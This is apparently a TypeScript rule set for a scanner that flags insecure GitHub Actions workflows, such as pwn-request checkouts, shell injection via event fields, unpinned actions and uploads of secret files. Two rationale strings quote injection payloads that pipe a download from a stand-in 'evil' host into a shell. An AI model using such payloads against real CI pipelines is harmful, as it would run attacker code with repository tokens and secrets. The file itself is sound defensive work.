export type GithubSeverity = "critical" | "high" | "medium" | "low";

export interface GithubRule {
  id: string;
  severity: GithubSeverity;
  category:
    | "token"
    | "injection"
    | "supply-chain"
    | "runner"
    | "secret";
  title: string;
  /** Regex checked against the full workflow YAML content. */
  re: RegExp;
  /** True for a rule that matches the ABSENCE of something (negative probe). */
  absence?: boolean;
  rationale: string;
  fix: string;
}

export const GITHUB_RULES: GithubRule[] = [
  // ──────────────────────────────────────────────────────────────
  // Token / secret handling
  // ──────────────────────────────────────────────────────────────
  {
    id: "gh-pull-request-target-with-checkout",
    severity: "critical",
    category: "token",
    title: "pull_request_target workflow checks out untrusted PR head",
    // Require both the trigger AND a checkout with a user-controlled ref.
    // The [\s\S] spans multiple lines; the lookahead enforces both elements exist.
    re: /(?=[\s\S]*?\bpull_request_target\b)[\s\S]*?uses:\s*actions\/checkout@[\w./-]+[\s\S]*?ref:\s*\$\{\{\s*github\.event\.pull_request\.head\b/m,
    rationale: "pull_request_target runs with the base-branch's GITHUB_TOKEN and access to secrets. Checking out the untrusted PR head (github.event.pull_request.head.sha/ref) lets a forked PR author execute arbitrary code with write permissions — the classic pwn-request vector.",
    fix: "Use `pull_request` instead, or split the workflow: validate with `pull_request_target` (no checkout of PR code), then run untrusted code in a separate `pull_request` workflow without secrets. If you must checkout PR head, do it in an isolated job with `permissions: read-all` and no secrets.",
  },
  {
    id: "gh-secrets-in-if-condition",
    severity: "medium",
    category: "token",
    title: "secrets.* used inside an `if:` condition (always truthy)",
    re: /^\s*if:\s*\$\{\{\s*[^}]*\bsecrets\./im,
    rationale: "In an `if:` expression, `secrets.X` always evaluates truthy — even when the secret is empty or unset — because GitHub masks the value before expression evaluation. The gate you think you're putting in place does nothing.",
    fix: "Gate on `vars.X`, a computed job output, or `github.event_name`. Check secrets inside a `run:` step with explicit `[ -n \"$TOKEN\" ]` instead of in an `if:`.",
  },
  {
    id: "gh-token-write-all",
    severity: "medium",
    category: "token",
    title: "Workflow grants write-all or broad write permissions to GITHUB_TOKEN",
    re: /^\s*permissions:\s*(?:write-all\b|\r?\n(?:\s*#[^\n]*\n)*\s*(?:contents|packages|actions|id-token|deployments|pull-requests|issues|security-events)\s*:\s*write\b)/im,
    rationale: "The default GITHUB_TOKEN should follow least privilege. `write-all` (or broad top-level `contents: write`, `id-token: write`, etc.) means every step — including third-party actions — can push code, publish packages, or mint OIDC tokens.",
    fix: "Set `permissions:` at the workflow level to `read-all` (or `contents: read`), then grant narrower writes per-job only where needed: `jobs.release.permissions: { contents: write }`.",
  },

  // ──────────────────────────────────────────────────────────────
  // Expression injection
  // ──────────────────────────────────────────────────────────────
  {
    id: "gh-expression-injection-run",
    severity: "critical",
    category: "injection",
    title: "github.event.* interpolated into a `run:` script (shell injection)",
    // Match a `run:` block (|, >, or inline quoted/unquoted) that contains ${{ github.event.<x> }}.
    // The [^\n]* on the same line keeps the match tight; for block scalars we also look a few lines ahead.
    re: /run:\s*(?:\|[-+]?|>[-+]?)?[^\n]*(?:\n[^\n]*){0,40}?\$\{\{\s*github\.event\.[\w.]+\s*\}\}/m,
    rationale: "`${{ github.event.pull_request.title }}`, `github.event.issue.title`, `github.event.comment.body`, and similar fields are attacker-controlled strings. GitHub interpolates them into the shell script *before* the shell parses it, so a title like `\"; curl evil.sh | sh; #` becomes shell code running with the workflow's token.",
    fix: "Pass the field through an `env:` var and reference it as `$VAR` in the script: `env: { TITLE: ${{ github.event.pull_request.title }} }` and `run: echo \"$TITLE\"`. The shell then treats it as data, not code.",
  },
  {
    id: "gh-head-ref-injection",
    severity: "critical",
    category: "injection",
    title: "github.head_ref interpolated into a `run:` script",
    re: /run:\s*(?:\|[-+]?|>[-+]?)?[^\n]*(?:\n[^\n]*){0,40}?\$\{\{\s*github\.head_ref\s*\}\}/m,
    rationale: "`github.head_ref` is the source branch of a PR and can contain shell metacharacters. A branch name like `foo;curl evil|sh` executes when interpolated into a `run:` step.",
    fix: "Bind to an `env:` variable and reference via `$HEAD_REF`: `env: { HEAD_REF: ${{ github.head_ref }} }`.",
  },

  // ──────────────────────────────────────────────────────────────
  // Supply-chain / action pinning
  // ──────────────────────────────────────────────────────────────
  {
    id: "gh-action-not-pinned-sha",
    severity: "medium",
    category: "supply-chain",
    title: "Third-party action pinned to a mutable ref (tag/branch), not a commit SHA",
    // Exclude first-party / well-known vendors (lower severity covered by a separate rule).
    // Match owner/repo@ref where ref is NOT a 40-char hex SHA.
    re: /uses:\s*(?!(?:actions|github|docker|aws-actions|google-github-actions|azure|hashicorp)\/)[\w.-]+\/[\w./-]+@(?![0-9a-f]{40}\b)[\w.-]+/i,
    rationale: "Tags and branches on third-party actions are mutable. An attacker who compromises the action's repo (or a maintainer who pushes a malicious v1) gets code execution in every repo that uses the tag — the `tj-actions/changed-files` incident exfiltrated secrets from thousands of repos this way.",
    fix: "Pin to a full 40-character commit SHA with a version comment: `uses: some/action@abc1234...def # v1.2.3`. Use Dependabot or `pinact` to keep SHAs updated.",
  },
  {
    id: "gh-action-not-pinned-sha-official",
    severity: "low",
    category: "supply-chain",
    title: "First-party action pinned to a tag, not a commit SHA",
    re: /uses:\s*(?:actions|docker)\/[\w./-]+@(?![0-9a-f]{40}\b)[\w.-]+/i,
    rationale: "Even official actions/* and docker/* actions should ideally be SHA-pinned in high-assurance environments. They're generally safe, but a compromised maintainer or mis-pushed tag still affects you.",
    fix: "Pin to a 40-character commit SHA with a version comment. For first-party actions this is lower priority than third-party, but recommended for sensitive workflows (release, deploy).",
  },
  {
    id: "gh-action-from-fork",
    severity: "low",
    category: "supply-chain",
    title: "Uses a non-verified third-party action from a personal account",
    // Matches owner/repo@main or @master specifically, excluding trusted orgs.
    re: /uses:\s*(?!(?:actions|github|docker|aws-actions|google-github-actions|azure|hashicorp)\/)[\w.-]+\/[\w./-]+@(?:main|master|develop)\b/i,
    rationale: "Running an action from an individual's GitHub account (or any non-verified org) pinned to `main`/`master` means that user can push code into your CI at any time.",
    fix: "Prefer verified-publisher or official actions. If you must use a community action, pin to a commit SHA and vendor-review it.",
  },

  // ──────────────────────────────────────────────────────────────
  // Workflow misc
  // ──────────────────────────────────────────────────────────────
  {
    id: "gh-self-hosted-runner",
    severity: "low",
    category: "runner",
    title: "Workflow uses a self-hosted runner",
    re: /^\s*runs-on:\s*(?:\[[^\]]*\bself-hosted\b|['"]?self-hosted['"]?)/im,
    rationale: "Self-hosted runners expand the attack surface: a malicious PR or compromised workflow can persist on the runner, access the host network, and potentially pivot into your internal environment. Not inherently bad, but needs isolation review.",
    fix: "Use ephemeral / single-use runners (e.g., ARC, actions-runner-controller) rather than long-lived machines. Never run self-hosted runners on public repos without `pull_request`-only trigger restrictions.",
  },
  {
    id: "gh-artifact-upload-secrets",
    severity: "high",
    category: "secret",
    title: "actions/upload-artifact uploads a path that looks secret-bearing",
    re: /uses:\s*actions\/upload-artifact@[\w./-]+[\s\S]{0,600}?path:[\s\S]{0,300}?(?:\.env\b|\bid_rsa\b|\*\.pem\b|\*\.key\b|\/\.ssh\/)/i,
    rationale: "Build artifacts are downloadable by anyone with read access to the workflow run. Uploading .env files, SSH keys, or PEM/KEY files exposes them to every collaborator and — on public repos — the internet.",
    fix: "Narrow the `path:` glob to exclude sensitive files. Prefer explicit `include:` paths and review what a `**` pattern actually matches. Store real secrets in the GitHub Secrets store, not artifacts.",
  },
];
